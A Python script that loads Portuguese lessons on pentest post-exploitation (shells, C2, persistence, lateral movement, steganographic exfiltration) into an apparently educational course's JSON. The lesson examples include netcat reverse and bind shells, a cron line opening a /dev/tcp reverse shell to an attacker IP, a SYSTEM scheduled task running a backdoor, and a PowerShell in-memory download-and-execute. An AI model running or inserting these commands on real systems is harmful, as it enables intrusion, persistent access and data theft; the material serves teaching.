# -*- coding: utf-8 -*-
import json
import os

# Caminho para o banco de dados de definições das lições
JSON_PATH = '/home/gabriel/Documentos/dev/cyberduo/scripts/lesson_definitions.json'

with open(JSON_PATH, 'r', encoding='utf-8') as f:
    lessons = json.load(f)

# Remover lições antigas do Módulo 8 para evitar duplicatas e conflitos de id/filename
lessons = [l for l in lessons if l['module'] != '8']

# Novas lições detalhadas e didáticas baseadas 100% no material Cisco
module_8_lessons = [
  {
    "filename": "8.0-introducao.html",
    "module": "8",
    "title": "Executando Técnicas de Pós-Exploração",
    "victory_msg": "PÓS-EXPLORAÇÃO INICIADA!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-flag",
        "title": "Objetivos da Pós-Exploração (Cisco 8.0.1)",
        "content": "Em um teste de penetração, o objetivo final vai muito além de apenas encontrar vulnerabilidades. Após comprometer uma máquina alvo, a fase de <b>Pós-Exploração</b> serve para avaliar o risco de perdas potenciais que o cliente sofreria se um atacante real invadisse o sistema.<br><br>🛡️ Esta fase demonstra na prática até onde o invasor pode penetrar na rede interna e a quais dados confidenciais ele teria acesso total.",
        "highlight": "Na pós-exploração, você prova o impacto financeiro e operacional de uma invasão real!"
      },
      {
        "type": "teach",
        "icon": "fa-clock",
        "title": "Medindo o Tempo de Detecção (Cisco 8.0.1)",
        "content": "Outro objetivo crucial da pós-exploração é <b>avaliar a eficácia dos defensores</b> da organização (a equipe azul ou o SOC).<br><br>⏱️ Durante os testes, avalia-se quanto tempo a equipe de segurança leva para detectar as atividades suspeitas, identificar arquivos maliciosos e responder ao exploit. Isso ajuda a calibrar os sensores e alertas de intrusão do cliente.",
        "highlight": "Entrar sem ser detectado avalia a furtividade e a competência de monitoramento do SOC!"
      },
      {
        "type": "quiz",
        "task": "De acordo com as boas práticas da Cisco, qual é um objetivo essencial ao executar atividades de pós-exploração em um pentest?",
        "options": [
          "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
          "Causar danos físicos irreparáveis para forçar a empresa a comprar novos hardwares.",
          "Instalar softwares de mineração de bitcoin ocultos para financiar o projeto."
        ],
        "correctText": "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
        "explanation": "Testar a capacidade de resposta e detecção do SOC ajuda a calibrar sistemas de alarmes e otimizar processos de incidentes da empresa."
      },
      {
        "type": "fill",
        "sentence": "Após a invasão inicial, o testador executa atividades de pós-exploração para mover-se lateralmente e manter a ___ permanente no sistema comprometido.",
        "options": [
          "persistência",
          "criptografia",
          "desconexão"
        ],
        "correctText": "persistência",
        "explanation": "A persistência garante que o acesso seja mantido mesmo após reboots do servidor, permitindo demonstrar o impacto de longo prazo."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você compreendeu a base pedagógica e os objetivos reais de pós-exploração no pentest!"
  },
  {
    "filename": "8.1a-shells-c2.html",
    "module": "8",
    "title": "Canal de Acesso: Shells e Utilitários C2",
    "victory_msg": "CONEXÕES E C2 DOMINADOS!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-terminal",
        "title": "O que é um Shell? (Cisco 8.1.2)",
        "content": "Um <b>shell</b> é o software que serve de interface entre o usuário e o kernel do Sistema Operacional. No Linux, temos shells como <b>Bash, KSH e TCSH</b>. No Windows, o clássico é o CMD (`cmd.exe`) ou o moderno <b>PowerShell</b> (que combina scripts, cmdlets e administração avançada).<br><br>Durante um pentest, precisamos trazer essa linha de comando do alvo de volta ao nosso computador para gerenciar o sistema comprometido.",
        "highlight": "Shells permitem executar comandos diretamente no sistema operacional do alvo."
      },
      {
        "type": "teach",
        "icon": "fa-circle-dot",
        "title": "Bind Shell: Aguardando a Conexão (Cisco 8.1.2)",
        "content": "Em um <b>Bind Shell</b>, o atacante executa um backdoor na máquina da vítima que abre uma porta de rede e fica <b>escutando</b> (aguardando conexão). O atacante então inicia a conexão de fora e assume o controle.<br><br>⚠️ <b>Principal Desafio</b>: Se a vítima estiver atrás de um firewall ou NAT, a porta de escuta será bloqueada e o atacante não conseguirá se conectar.",
        "highlight": "Bind Shell = Vítima escuta a porta e o atacante se conecta."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Bind Shell com Netcat (Cisco 8.1.3)",
        "scenario": "Para criar um Bind Shell em um servidor Linux comprometido (192.168.78.6) usando a ferramenta Netcat, o pentester executa a escuta na porta 1234 direcionando para o Bash:",
        "code": "omar@jorel:~$ nc -lvp 1234 -e /bin/bash\nlistening on [any] 1234 ...",
        "takeaway": "No sistema do atacante, basta conectar no IP do alvo: 'nc -nv 192.168.78.6 1234' para ganhar o shell."
      },
      {
        "type": "teach",
        "icon": "fa-arrows-split-up-and-left",
        "title": "Reverse Shell: Burlado Firewalls (Cisco 8.1.2)",
        "content": "No <b>Reverse Shell (Shell Reverso)</b>, o processo é invertido: o <b>atacante</b> abre um ouvinte na sua própria máquina e a <b>vítima</b> inicia a conexão de dentro para fora, apontando para o IP do invasor.<br><br>🚀 <b>Grande Vantagem</b>: Como a conexão começa de dentro da rede corporativa para a internet, a maioria das políticas de firewall permite a saída, contornando proteções externas de entrada.",
        "highlight": "Reverse Shell = Atacante escuta a porta e a vítima se conecta de volta a ele."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Reverse Shell com Netcat (Cisco 8.1.3)",
        "scenario": "O atacante abre um listener em sua máquina (192.168.78.147) na porta 666 e força o servidor da vítima a se conectar de volta:",
        "code": "# 1. Na máquina do atacante:\n$ nc -lvp 666\n\n# 2. Na máquina da vítima:\n$ nc 192.168.78.147 666 -e /bin/bash",
        "takeaway": "A conexão de saída da vítima dá ao atacante controle imediato via terminal na porta 666."
      },
      {
        "type": "quiz",
        "task": "Por que o Shell Reverso (Reverse Shell) é muito mais eficaz do que o Bind Shell em cenários de pentests reais?",
        "options": [
          "Porque ele inicia a conexão de dentro para fora da rede, contornando as restrições de firewall que barram conexões de entrada.",
          "Porque ele consome menos largura de banda e criptografa nativamente em AES-256.",
          "Porque ele não exige a instalação do utilitário Netcat ou do utilitário Bash."
        ],
        "correctText": "Porque ele inicia a conexão de dentro para fora da rede, contornando as restrições de firewall que barram conexões de entrada.",
        "explanation": "A maioria dos firewalls de borda bloqueia qualquer conexão vinda de fora (Bind), mas permite que servidores internos façam conexões para a internet (Reverso)."
      },
      {
        "type": "match",
        "title": "Comandos Meterpreter (Cisco Tabela 8-3)",
        "pairs": [
          {
            "term": "lpwd",
            "definition": "Exibe o diretório local no sistema de ataque"
          },
          {
            "term": "clearev",
            "definition": "Limpa os logs de aplicativo, sistema e segurança"
          },
          {
            "term": "hashdump",
            "definition": "Extrai as senhas criptografadas do banco SAM (Windows)"
          },
          {
            "term": "recurso",
            "definition": "Executa comandos Meterpreter listados em arquivo de texto"
          }
        ]
      },
      {
        "type": "teach",
        "icon": "fa-server",
        "title": "Sistemas de Comando e Controle - C2 (Cisco 8.1.4)",
        "content": "Atacantes avançados utilizam estruturas de <b>Comando e Controle (C2 / CnC)</b> para gerenciar sistemas invadidos. O C2 cria um <b>canal encoberto (covert channel)</b> para transferir dados de forma secreta sem levantar alertas nas políticas de segurança da rede.<br><br>Ativos de C2 podem ser servidores em nuvem, hosts comprometidos intermediários ou até tráfego disfarçado em redes sociais (Twitter, Dropbox).",
        "highlight": "TrevorC2 e DNSCat2 são exemplos clássicos de C2 focados em evasão."
      },
      {
        "type": "match",
        "title": "Ferramentas e Utilitários C2 (Cisco 8.1.4)",
        "pairs": [
          {
            "term": "WMImplant",
            "definition": "Baseado em PowerShell, usa WMI como canal C2"
          },
          {
            "term": "DNSCat2",
            "definition": "Cria canais encobertos criptografados usando DNS"
          },
          {
            "term": "TrevorC2",
            "definition": "Evasivo baseado em Python, disfarça comandos como HTTP"
          },
          {
            "term": "Twittor",
            "definition": "Usa mensagens diretas de redes sociais para emitir comandos"
          }
        ]
      },
      {
        "type": "fill",
        "sentence": "No Netcat, também conhecido como a faca suíça do TCP/IP, o parâmetro ___ é usado para redirecionar e executar a shell após a conexão ser fechada.",
        "options": [
          "-e",
          "-l",
          "-p"
        ],
        "correctText": "-e",
        "explanation": "O parâmetro '-e' (exec) instrui o Netcat a redirecionar as entradas e saídas do executável (/bin/bash ou cmd.exe) diretamente para a conexão de rede."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você dominou o uso de Netcat, Meterpreter e compreendeu o funcionamento estratégico dos servidores C2!"
  },
  {
    "filename": "8.1b-persistencia-avancada.html",
    "module": "8",
    "title": "Persistência Avançada: Agendamentos, Serviços e Contas",
    "victory_msg": "PERSISTÊNCIA CONSOLIDADA!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-clock",
        "title": "Agendador de Tarefas do Windows (Cisco 8.1.6)",
        "content": "No Windows, o Agendador de Tarefas (`taskschd.msc`) é uma mina de ouro para a persistência. Um invasor pode agendar tarefas para rodar no boot ou periodicamente.<br><br>⚙️ Se o atacante tiver acesso à GUI, ele pode usar tarefas agendadas para <b>burlar o UAC (Controle de Conta de Usuário)</b>, pois tarefas podem ser configuradas para rodar com os privilégios máximos do sistema (SYSTEM) sem solicitar credenciais administrativas.",
        "highlight": "Tarefas agendadas rodam de forma invisível e persistente em privilégio SYSTEM."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Criando Tarefa Agendada no Windows",
        "scenario": "Para evitar alarmes, o pentester agenda a execução de um backdoor compactado para rodar nos fins de semana à noite (quando não há monitoramento ativo e a rede está ociosa):",
        "code": "> schtasks /create /tn \"SystemMaintenance\" /tr \"c:\\temp\\backdoor.exe\" /sc weekly /d SAT /st 23:00 /ru \"SYSTEM\"",
        "takeaway": "O utilitário schtasks configura persistência nativa e com privilégio máximo de forma imperceptível."
      },
      {
        "type": "teach",
        "icon": "fa-repeat",
        "title": "Daemons Customizados e Cron Jobs no Linux (Cisco 8.1.7)",
        "content": "No Linux, a forma mais garantida de sobrevivência a reinicializações é criar <b>daemons/serviços customizados</b> iniciados na inicialização do boot ou configurar agendamentos na <b>Crontab (Cron Jobs)</b>.<br><br>Esses scripts garantem a execução regular do payload e restabelecem a conexão se ela cair.",
        "highlight": "Daemons e crontabs executam comandos silenciosos de volta para a máquina do atacante."
      },
      {
        "type": "example",
        "icon": "fa-code",
        "title": "Prática - Cron Job de Persistência no Linux",
        "scenario": "O invasor insere uma linha no crontab do Linux para executar uma tentativa de shell reverso secreta a cada 5 minutos:",
        "code": "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.78.147/4444 0>&1'",
        "takeaway": "A cada 5 minutos, a vítima tentará silenciosamente nos dar acesso root de volta."
      },
      {
        "type": "quiz",
        "task": "Por que a criação de tarefas agendadas administrativas (via 'schtasks') com privilégios de SYSTEM permite contornar proteções interativas de controle de conta (UAC)?",
        "options": [
          "Porque as tarefas agendadas administrativas rodam em privilégio de sistema máximo do kernel sem exigir validação ou interação humana.",
          "Porque o UAC só funciona em navegadores de internet e não monitora o prompt de comando.",
          "Porque as tarefas agendadas administrativas removem fisicamente o antivírus da máquina da vítima."
        ],
        "correctText": "Porque as tarefas agendadas administrativas rodam em privilégio de sistema máximo do kernel sem exigir validação ou interação humana.",
        "explanation": "O agendador de tarefas executa processos administrativos no background de forma nativa e não interativa, o que burla as caixas de alerta do UAC."
      },
      {
        "type": "fill",
        "sentence": "Para configurar persistência nativa a cada poucos minutos no Linux, editamos os agendamentos salvos no utilitário de tabela do sistema operacional chamado ___.",
        "options": [
          "crontab",
          "systemctl",
          "passwd"
        ],
        "correctText": "crontab",
        "explanation": "A tabela do daemon Cron (crontab) executa tarefas agendadas de background de forma regular."
      },
      {
        "type": "teach",
        "icon": "fa-user-plus",
        "title": "Novo Usuário Administrador (Cisco 8.1.8)",
        "content": "Se o testador de penetração obteve privilégios de <b>Administrador (Windows) ou Root (Linux)</b>, ele pode consolidar seu acesso criando contas alternativas e adicionais de usuários na máquina.<br><br>🔐 <b>Boas Práticas de Ataque</b>: Crie contas alternativas usando <b>senhas complexas e robustas</b> para evitar que atacantes rivais façam brute force em sua porta dos fundos ou que os administradores descubram acessos fracos.",
        "highlight": "Novas contas de usuário fornecem persistência legítima via protocolos de RDP ou SSH."
      },
      {
        "type": "quiz",
        "task": "Ao criar contas alternativas de administrador para manter a persistência após comprometer um sistema, qual recomendação deve ser seguida?",
        "options": [
          "Utilizar senhas altamente complexas para evitar o sequestro do acesso por outros agentes de ameaça.",
          "Utilizar senhas vazias ou 'admin123' para facilitar acessos rápidos de qualquer local.",
          "Não configurar senhas, já que o sistema automaticamente desativa a autenticação para testadores."
        ],
        "correctText": "Utilizar senhas altamente complexas para evitar o sequestro do acesso por outros agentes de ameaça.",
        "explanation": "Senhas fracas deixadas por pentesters representam um risco gigantesco de intrusão real por cibercriminosos (que varrem a rede constantemente)."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você compreendeu a fundo os mecanismos de persistência no Windows e Linux, garantindo o acesso simulado a longo prazo!"
  },
  {
    "filename": "8.2a-movimento-lateral.html",
    "module": "8",
    "title": "Movimento Lateral e Living off the Land",
    "victory_msg": "PIVOTAGEM E LOLBINS DOMINADOS!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-arrows-left-right",
        "title": "O que é Movimento Lateral? (Cisco 8.2.1)",
        "content": "O <b>Movimento Lateral</b> (também chamado de <b>Pivotagem / Pivoting</b>) é o ato de usar o primeiro sistema comprometido como um trampolim para atacar outras máquinas na rede interna corporativa.<br><br>O objetivo principal é evitar a detecção, mapear o ambiente e obter acesso a <b>dados confidenciais</b>. O processo de transferir esses dados do interior para fora do perímetro da organização de forma oculta é a <b>Exfiltração de Dados</b>.",
        "highlight": "A primeira máquina invadida raramente é o alvo final. Ela serve para pivotar até o objetivo."
      },
      {
        "type": "teach",
        "icon": "fa-network-wired",
        "title": "Estratégia de Segmentação de Rede (Cisco 8.2.2)",
        "content": "O movimento lateral só é possível se o cliente não possuir uma estratégia adequada de <b>Segmentação de Rede</b>.<br><br>🛡️ Para proteger a organização, utilizam-se firewalls internos, VLANs (redes locais virtuais) ou microsegmentação em ambientes virtualizados e containerizados. Testar a eficácia dessa segmentação de rede de forma frequente é vital no pentest.",
        "highlight": "VLANs e firewalls internos bem configurados restringem a movimentação lateral do atacante."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Habilitando RDP via Metasploit (Cisco 8.2.2)",
        "scenario": "Para obter controle visual do sistema Windows invadido a partir do Meterpreter, o testador utiliza o módulo de pós-exploração para ativar o serviço de RDP (Remote Desktop) e configurar permissões de firewall:",
        "code": "meterpreter > run post/windows/manage/enable_rdp\n[*] Enabling Remote Desktop Service...\n[*] Opening RDP Port in Windows Firewall...\n[+] Service enabled successfully!",
        "takeaway": "O RDP oferece uma interface gráfica completa criptografada, o que oculta o que você faz dos sensores de tráfego de rede."
      },
      {
        "type": "quiz",
        "task": "Qual é a principal desvantagem ou risco de se utilizar conexões de Área de Trabalho Remota (RDP) para se mover lateralmente durante um engajamento?",
        "options": [
          "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
          "As conexões RDP não oferecem interface gráfica (GUI), limitando as ações a comandos CMD brutos.",
          "O tráfego de rede RDP não aceita criptografia, permitindo que firewalls descubram senhas na rede facilmente."
        ],
        "correctText": "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
        "explanation": "No Windows clássico de desktop, conectar via RDP derruba a sessão do usuário ativo ou exige autorização visual dele, expondo o atacante na hora."
      },
      {
        "type": "teach",
        "icon": "fa-ghost",
        "title": "Living off the Land e Malware Sem Arquivo (Cisco 8.2.3)",
        "content": "Instalar binários maliciosos ou vírus no disco da vítima é barulhento e facilmente bloqueado pelo antivírus. Os atacantes preferem o <b>Living-off-the-Land (LOLBins)</b>.<br><br>Essa técnica (frequentemente chamada de <b>malware sem arquivo / fileless</b>) usa utilitários e comandos legítimos e nativos do próprio sistema operacional (como PowerShell, WMI, WinRM e PsExec) para executar tarefas maliciosas.",
        "highlight": "LOLBins usam a própria 'lei' do sistema contra ele, agindo na memória sem salvar arquivos em disco!"
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Execução In-Memory com PowerShell (Cisco 8.2.3)",
        "scenario": "Para executar um script de backdoor sem baixar nenhum executável ou arquivo no HD da vítima, o atacante usa a diretiva IEX para baixar e rodar o script diretamente na memória RAM:",
        "code": "PS > IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/Invoke-PowerShellTcp.ps1')",
        "takeaway": "Como o arquivo PS1 roda direto na memória RAM, a análise de disco estática do antivírus não detecta a execução."
      },
      {
        "type": "match",
        "title": "Comandos PowerShell na Pós-Exploração (Cisco Tabela 8-4)",
        "pairs": [
          {
            "term": "Select-String",
            "definition": "Localiza textos (como senhas) dentro de arquivos de diretórios"
          },
          {
            "term": "Get-HotFix",
            "definition": "Obtém a listagem completa de correções e patches do S.O."
          },
          {
            "term": "Get-Process",
            "definition": "Lista todos os processos ativos em execução no sistema"
          },
          {
            "term": "DownloadFile",
            "definition": "Busca e baixa arquivos via HTTP similar ao utilitário wget do Linux"
          }
        ]
      },
      {
        "type": "teach",
        "icon": "fa-folder-open",
        "title": "PowerSploit, Empire e BloodHound (Cisco 8.2.3)",
        "content": "A pós-exploração corporativa conta com arsenais potentes baseados em PowerShell:<br><br>🛠️ <b>PowerSploit</b>: Módulos como `Invoke-Mimikatz` (carrega Mimikatz 2.0 refletivamente na RAM para extrair senhas do LSASS) e `Invoke-NinjaCopy` (copia arquivos de volumes NTFS brutos contornando travas do S.O.).<br><br>👑 <b>Empire</b>: Framework C2 open source que roda agentes PowerShell de forma evasiva.<br><br>🩸 <b>BloodHound</b>: Software JS de página única que usa <b>Teoria dos Grafos</b> para mapear relacionamentos do Active Directory e revelar caminhos ocultos de ataque."
      },
      {
        "type": "quiz",
        "task": "Qual framework C2 de código aberto permite executar agentes e payloads pós-exploração em máquinas Windows e Linux sem a necessidade do powershell.exe?",
        "options": [
          "Empire",
          "Nmap",
          "Ettercap"
        ],
        "correctText": "Empire",
        "explanation": "O Empire provê agentes muito eficientes baseados em PowerShell para Windows e Python para Linux, focados em modularidade e evasão."
      },
      {
        "type": "match",
        "title": "Conjunto de Ferramentas Sysinternals (Cisco 8.2.3)",
        "pairs": [
          {
            "term": "PsExec",
            "definition": "Executa remotamente e exibe as saídas de comandos no terminal local"
          },
          {
            "term": "PsGetSid",
            "definition": "Exibe os identificadores de segurança (SIDs) dos usuários"
          },
          {
            "term": "PsLoggedOn",
            "definition": "Lista contas de usuários conectadas ativamente no host"
          },
          {
            "term": "PsFile",
            "definition": "Exibe a lista de arquivos abertos e compartilhados do sistema"
          }
        ]
      },
      {
        "type": "fill",
        "sentence": "Para habilitar o gerenciamento remoto nativo (PS remoting / WinRM) do Windows e abrir o firewall para receber conexões de outros sistemas na rede, rodamos Enable-___. (-SkipNetworkProfileCheck -Force)",
        "options": [
          "PSRemoting",
          "Process",
          "Service"
        ],
        "correctText": "PSRemoting",
        "explanation": "O cmdlet Enable-PSRemoting configura o WinRM para aceitar conexões administrativas remotas via PowerShell."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você aprendeu a saltar entre sistemas com pivotagem, usar utilitários legítimos (LOLBins) e varrer mídias e AD com BloodHound e Sysinternals!"
  },
  {
    "filename": "8.2b-escalada-limpeza.html",
    "module": "8",
    "title": "Elevação de Acesso, Higienização e Evasão Esteganográfica",
    "victory_msg": "MÓDULO 8 CONCLUÍDO COM MAESTRIA!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-angles-up",
        "title": "Escalada de Privilégios (Cisco 8.2.5)",
        "content": "Ao obter o acesso inicial a uma máquina, o pentester geralmente ganha uma conta comum de baixas permissões. A <b>Escalada de Privilégios</b> é o abuso de falhas para acessar recursos restritos.<br><br>↕️ <b>Escalada Vertical</b>: Ocorre quando um usuário comum obtém privilégios de alto nível hierárquico (ex: o usuário `derek` vira `root` ou `SYSTEM`).<br><br>↔️ <b>Escalada Horizontal</b>: Acessar dados de contas de mesmo nível de privilégio (ex: mudar IDs de faturas ou ler posts privados de terceiros em fóruns).",
        "highlight": "A escalada de privilégios demonstra as falhas internas de autorização e controle de acessos da máquina."
      },
      {
        "type": "quiz",
        "task": "Você acessa a sua conta de usuário no Pixel Paradise e percebe que as faturas são acessadas por um ID numérico na URL: 'raccount?id=1050'. Ao alterar manualmente para '1051', você tem acesso completo à fatura privada de outro usuário comum. Que tipo de falha pedagógica isso representa?",
        "options": [
          "Escalada de privilégios horizontal (abuso de autorização lateral).",
          "Escalada de privilégios vertical (escalada direta para root).",
          "Ataque cinético industrial SCADA/Modbus."
        ],
        "correctText": "Escalada de privilégios horizontal (abuso de autorização lateral).",
        "explanation": "Você não virou administrador geral, mas acessou dados sensíveis de outro usuário com o mesmo nível de privilégios (Broken Object Level Authorization - BOLA / IDOR)."
      },
      {
        "type": "teach",
        "icon": "fa-broom",
        "title": "Como Cobrir Rastros e Limpar Sistemas (Cisco 8.2.7)",
        "content": "Ao término do pentest, é vital limpar o ambiente para retornar todos os sistemas do cliente ao estado original de integridade:<br><br>🧼 <b>Processo de Limpeza</b>:<br>• Excluir todas as contas de usuário criadas para o teste.<br>• Excluir todos os scripts, backdoors, daemons, binários e arquivos temporários.<br>• Restaurar cabeçalhos, logs de auditoria e configurações originais.<br>• Seguir as diretrizes da publicação do <b>NIST SP 800-88 Rev 1 (Media Sanitization)</b> para higienizar mídias com segurança.",
        "highlight": "Todo processo e limite de limpeza deve ser detalhado previamente no documento de Regras de Engajamento (ROE)."
      },
      {
        "type": "quiz",
        "task": "Em qual etapa do engajamento de teste de penetração o auditor deve discutir e documentar junto ao cliente os processos de limpeza e remoção de dados das máquinas de ataque?",
        "options": [
          "Na fase de pré-engajamento, documentando tudo no documento de Regras de Engajamento (Rules of Engagement - ROE).",
          "Apenas no último dia dos testes, decidindo os métodos por conta própria.",
          "O pentester não deve realizar a limpeza das ferramentas, deixando isso a cargo do time de TI do cliente."
        ],
        "correctText": "Na fase de pré-engajamento, documentando tudo no documento de Regras de Engajamento (Rules of Engagement - ROE).",
        "explanation": "Para evitar a perda não intencional de dados produtivos do cliente e garantir transparência legal, os limites e autorizações de limpeza devem constar nas regras de engajamento (ROE)."
      },
      {
        "type": "teach",
        "icon": "fa-file-image",
        "title": "Esteganografia com a ferramenta Steghide (Cisco 8.2.7)",
        "content": "Os atacantes (e pentesters para demonstrar a exfiltração silenciosa) utilizam <b>Esteganografia</b> para ocultar dados secretos dentro de mídias inocentes (como arquivos JPG, BMP ou WAV). Isso evita que os sensores corporativos de DLP (Data Loss Prevention) detectem o vazamento.<br><br>A ferramenta clássica para isso no Kali Linux é o <b>steghide</b>, que permite embutir e extrair payloads criptografando a carga com uma frase secreta.",
        "highlight": "Esteganografia esconde a própria existência da informação secreta dentro de outra mídia."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Ocultando e Extraindo com Steghide (Cisco 8.2.8)",
        "scenario": "Para demonstrar a exfiltração de um documento secreto ('segredo.txt') oculto dentro de uma foto inocente ('foto.jpg') e extraí-lo do outro lado, o pentester roda os seguintes comandos no terminal:",
        "code": "# 1. Embutindo o arquivo secreto na foto de cobertura:\n$ steghide embed -cf foto.jpg -ef segredo.txt -p 'cyberduo123'\n\n# 2. Extraindo o arquivo secreto da foto contaminada:\n$ steghide extract -sf foto.jpg -p 'cyberduo123'",
        "takeaway": "-cf define o arquivo de cobertura (cover), -ef define o arquivo embutido e -sf define o stego-file."
      },
      {
        "type": "fill",
        "sentence": "No steghide, para embutir dados, o parâmetro que aponta para o arquivo que carrega a mensagem oculta (ex: segredo.txt) é o -ef, e o parâmetro que aponta para a imagem ou vídeo original de cobertura é o ___.",
        "options": [
          "-cf",
          "-sf",
          "-p"
        ],
        "correctText": "-cf",
        "explanation": "-cf representa o 'cover file' (a mídia legítima de disfarce) e -ef representa o 'embed file' (a carga de dados confidenciais)."
      },
      {
        "type": "match",
        "title": "Mapeando Boas Práticas de Limpeza (Cisco 8.2.7)",
        "pairs": [
          {
            "term": "Excluir contas de teste",
            "definition": "Remover credenciais extras criadas durante o engajamento"
          },
          {
            "term": "NIST SP 800-88",
            "definition": "Diretrizes e boas práticas para Sanitização de Mídia"
          },
          {
            "term": "Remover dados do cliente",
            "definition": "Apagar dados sensíveis das máquinas do atacante pós-relatório"
          },
          {
            "term": "Remover daemons/backdoors",
            "definition": "Garantir que nenhum serviço ou porta dos fundos continue ativa"
          }
        ]
      }
    ],
    "victory_title": "PARABÉNS! ACESSO E EXFILTRAÇÃO DOMINADOS!",
    "victory_msg": "Você completou o Módulo 8 com louvor! Você domina técnicas de persistência, movimentação lateral furtiva, escalada de privilégios e higienização pós-teste no padrão de excelência da Cisco."
  }
]

# Adicionar as novas lições reestruturadas
lessons.extend(module_8_lessons)

# Salvar de volta no banco de definições
with open(JSON_PATH, 'w', encoding='utf-8') as f:
    json.dump(lessons, f, ensure_ascii=False, indent=2)

print(f"✅ Definições do Módulo 8 injetadas com sucesso! ({len(module_8_lessons)} lições)")
